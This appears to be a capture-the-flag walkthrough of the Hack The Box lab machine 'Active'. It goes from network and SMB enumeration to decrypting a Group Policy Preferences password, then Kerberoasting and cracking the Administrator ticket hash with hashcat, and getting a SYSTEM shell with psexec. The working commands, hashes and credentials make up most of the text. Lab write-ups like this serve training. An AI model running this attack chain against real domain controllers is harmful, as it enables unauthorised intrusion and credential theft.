# active

└─# nmap 10.129.58.217   
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-16 20:47 EDT
Nmap scan report for 10.129.58.217
Host is up (0.17s latency).
Not shown: 983 closed tcp ports (reset)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49157/tcp open  unknown
49158/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 4.43 seconds

more descriptive nmap

┌──(root㉿kali)-[/home/kali]
└─# nmap -sV -sC -p 53,88,135,139,389,445,464,593,636,3268,3269,5722,9389,47001,49152-49158,49169,49170,49179 --min-rate 5000 10.129.58.217 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-16 20:49 EDT
Nmap scan report for 10.129.58.217
Host is up (0.16s latency).

PORT      STATE  SERVICE       VERSION
53/tcp    open   domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open   kerberos-sec  Microsoft Windows Kerberos (server time: 2022-08-17 00:49:33Z)
135/tcp   open   msrpc         Microsoft Windows RPC
139/tcp   open   netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open   ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open   microsoft-ds?
464/tcp   open   tcpwrapped
593/tcp   open   ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open   tcpwrapped
3268/tcp  open   ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open   tcpwrapped
5722/tcp  open   msrpc         Microsoft Windows RPC
9389/tcp  open   mc-nmf        .NET Message Framing
47001/tcp open   http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49152/tcp open   msrpc         Microsoft Windows RPC
49153/tcp open   msrpc         Microsoft Windows RPC
49154/tcp open   msrpc         Microsoft Windows RPC
49155/tcp open   msrpc         Microsoft Windows RPC
49156/tcp closed unknown
49157/tcp open   ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open   msrpc         Microsoft Windows RPC
49169/tcp open   msrpc         Microsoft Windows RPC
49170/tcp closed unknown
49179/tcp closed unknown
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2022-08-17T00:50:30
|_  start_date: 2022-08-17T00:45:07

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 76.69 seconds


# smb enumeration 

using smbmap

smbmap -H 10.129.58.217               
[+] IP: 10.129.58.217:445	Name: 10.129.58.217                                     
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	IPC$                                              	NO ACCESS	Remote IPC
	NETLOGON                                          	NO ACCESS	Logon server share 
	Replication                                       	READ ONLY	
	SYSVOL                                            	NO ACCESS	Logon server share 
	Users                                             	NO ACCESS	

using smbclient to access Replication

or we can use smbmap -H ip -R to recursively list all available files

# gpp policy

─# cat Groups.xml 
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>

using a gppgpassword:

 gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
GPPstillStandingStrong2k18

more shares available now with credentials

─# smbmap -H 10.129.58.217 -d active.htb -u SVC_TGS -p GPPstillStandingStrong2k18                  
[+] IP: 10.129.58.217:445	Name: 10.129.58.217                                     
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	IPC$                                              	NO ACCESS	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share 
	Replication                                       	READ ONLY	
	SYSVOL                                            	READ ONLY	Logon server share 
	Users                                             	READ ONLY	


└─# smbclient //10.129.58.217/Users -U active.htb\\SVC_TGS%GPPstillStandingStrong2k18     
Try "help" to get a list of possible commands.
smb: \> dir
  .                                  DR        0  Sat Jul 21 10:39:20 2018
  ..                                 DR        0  Sat Jul 21 10:39:20 2018
  Administrator                       D        0  Mon Jul 16 06:14:21 2018
  All Users                       DHSrn        0  Tue Jul 14 01:06:44 2009
  Default                           DHR        0  Tue Jul 14 02:38:21 2009
  Default User                    DHSrn        0  Tue Jul 14 01:06:44 2009
  desktop.ini                       AHS      174  Tue Jul 14 00:57:55 2009
  Public                             DR        0  Tue Jul 14 00:57:55 2009
  SVC_TGS                             D        0  Sat Jul 21 11:16:32 2018
g
		5217023 blocks of size 4096. 284209 blocks available
smb: \> cd SVC_TGS\
smb: \SVC_TGS\> dir
  .                                   D        0  Sat Jul 21 11:16:32 2018
  ..                                  D        0  Sat Jul 21 11:16:32 2018
  Contacts                            D        0  Sat Jul 21 11:14:11 2018
  Desktop                             D        0  Sat Jul 21 11:14:42 2018
  Downloads                           D        0  Sat Jul 21 11:14:23 2018
  Favorites                           D        0  Sat Jul 21 11:14:44 2018
  Links                               D        0  Sat Jul 21 11:14:57 2018
  My Documents                        D        0  Sat Jul 21 11:15:03 2018
  My Music                            D        0  Sat Jul 21 11:15:32 2018
  My Pictures                         D        0  Sat Jul 21 11:15:43 2018
  My Videos                           D        0  Sat Jul 21 11:15:53 2018
  Saved Games                         D        0  Sat Jul 21 11:16:12 2018
  Searches                            D        0  Sat Jul 21 11:16:24 2018

		5217023 blocks of size 4096. 284209 blocks available
smb: \SVC_TGS\> cd Desktop
smb: \SVC_TGS\Desktop\> dir
  .                                   D        0  Sat Jul 21 11:14:42 2018
  ..                                  D        0  Sat Jul 21 11:14:42 2018
  user.txt                           AR       34  Tue Aug 16 20:45:53 2022

		5217023 blocks of size 4096. 284209 blocks available


cat user.txt
82999eb7002e965b165839e2bd1c0c17

# kerberoasting

Kerberoasting
Background

Kerberos is a protocol for authentication used in Windows Active Directory environments (though it can be used for auth to Linux hosts as well). In 2014, Tim Medin presented an attack on Kerberos he called Kerberoasting. It’s worth reading through the presentation, as Tim uses good graphics to illustrate the process, but I’ll try to give a simple overview.

When you want to authenticate to some service using Kerberos, you contact the DC and tell it to which system service you want to authenticate. It encrypts a response to you with the service user’s password hash. You send that response to the service, which can decrypt it with it’s password, check who you are, and decide it if wants to let you in.

In a Kerberoasting attack, rather than sending the encrypted ticket from the DC to the service, you will use off-line brute force to crack the password associated with the service.

Most of the time you will need an active account on the domain in order to initial Kerberoast, but if the DC is configured with UserAccountControl setting “Do not require Kerberos preauthentication” enabled, it is possible to request and receive a ticket to crack without a valid account on the domain

using GetSPN.py

root@kali:~/hackthebox/active-10.10.10.100# cat GetUserSPNs.out 
$krb5tgs$23$*Administrator$ACTIVE.HTB$active/CIFS~445*$7028f37607953ce9fd6c9060de4aece5$55e2d21e37623a43d8cd5e36e39bfaffc52abead3887ca728d527874107ca042e0e9283ac478b1c91cab58c9184828e7a5e0af452ad2503e463ad2088ba97964f65ac10959a3826a7f99d2d41e2a35c5a2c47392f160d65451156893242004cb6e3052854a9990bac4deb104f838f3e50eca3ba770fbed089e1c91c513b7c98149af2f9a994655f5f13559e0acb003519ce89fa32a1dd1c8c7a24636c48a5c948317feb38abe54f875ffe259b6b25a63007798174e564f0d6a09479de92e6ed98f0887e19b1069b30e2ed8005bb8601faf4e476672865310c6a0ea0bea1ae10caff51715aea15a38fb2c1461310d99d6916445d7254f232e78cf9288231e436ab457929f50e6d4f70cbfcfd2251272961ff422c3928b0d702dcb31edeafd856334b64f74bbe486241d752e4cf2f6160b718b87aa7c7161e95fab757005e5c80254a71d8615f4e89b0f4bd51575cc370e881a570f6e5b71dd14f50b8fd574a04978039e6f32d108fb4207d5540b4e58df5b8a0a9e36ec2d7fc1150bb41eb9244d96aaefb36055ebcdf435a42d937dd86b179034754d2ac4db28a177297eaeeb86c229d0f121cf04b0ce32f63dbaa0bc5eafd47bb97c7b3a14980597a9cb2d83ce7c40e1b864c3b3a77539dd78ad41aceb950a421a707269f5ac25b27d5a6b7f334d37acc7532451b55ded3fb46a4571ac27fc36cfad031675a85e0055d31ed154d1f273e18be7f7bc0c810f27e9e7951ccc48d976f7fa66309355422124ce6fda42f9df406563bc4c20d9005ba0ea93fac71891132113a15482f3d952d54f22840b7a0a6000c8e8137e04a898a4fd1d87739bf5428d748086f0166b35c181729cc62b41ba6a9157333bb77c9e03dc9ac23782cf5dcebd11faad8ca3e3e74e25f21dc04ba9f1703bd51d100051c8f505cc8085056b94e349b57906ee8deaf026b3daa89e7c3fc747a6a31ae08376da259f3118370bef86b6e7c2f88d66400eccb122dec8028223f6dcde29ffaa5b83ecb1c3780a782a5797c527a26a7b51b62db3e4865ebc2a0a0d2c931550decb3e7ae581b59f070dd33e423a90ec2ef66982a1b6336afe968fa93f5dd2880a313dc05d4e5cf104b6d9a8316b9fe3dc16e057e0f5c835e111ab92795fb0033541916a57df8f8e6b8cc25ecff2775282ccee110c49376c2cec6b7bb95c265f1466994da89e69605594ead28d24212a137ee20197d8aa95f243c347e02616f40f4071c33f749f5b94d1259fd32174

using hashcat to decrypt

hashcat -m 13100 -a 0 pass.txt /usr/share/wordlists/rockyou.txt.gz --force 
hashcat (v6.2.5) starting

the password we get can be used for getting an access with smb and without it

we try to use psexec.py

python psexec.py active.htb/administrator@10.129.58.217                                              
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

Password:
[*] Requesting shares on 10.129.58.217.....
[*] Found writable share ADMIN$
[*] Uploading file umVJmALd.exe
[*] Opening SVCManager on 10.129.58.217.....
[*] Creating service qhjp on 10.129.58.217.....
[*] Starting service qhjp.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32> cd /

C:\Users\Administrator\Desktop> type root.txt
b5188a49a2578c8517ed684d35aa26c8


